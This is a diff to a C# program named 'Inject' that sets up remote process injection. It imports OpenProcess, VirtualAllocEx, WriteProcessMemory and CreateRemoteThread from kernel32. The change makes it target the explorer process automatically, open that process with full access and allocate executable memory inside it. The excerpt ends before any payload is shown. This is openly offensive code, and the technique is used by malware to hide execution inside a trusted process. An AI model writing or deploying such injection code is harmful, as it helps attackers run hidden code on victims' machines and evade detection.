@@ -4,33 +4,30 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Runtime.InteropServices;
+using System.Diagnostics;
 
 namespace Inject
 {
     class Program
     {
-        private const int ProcessId = 2824;
 
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-
         static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
 
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-
         static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
         [DllImport("kernel32.dll")]
-
         static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
 
         [DllImport("kernel32.dll")]
-
         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
 
         static void Main(string[] args)
         {
-            IntPtr hProcess = OpenProcess(0x001F0FFF, false, ProcessId);
+            Process[] expProc = Process.GetProcessesByName("explorer");
+            int pid = expProc[0].Id;
+            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
 
             IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
 
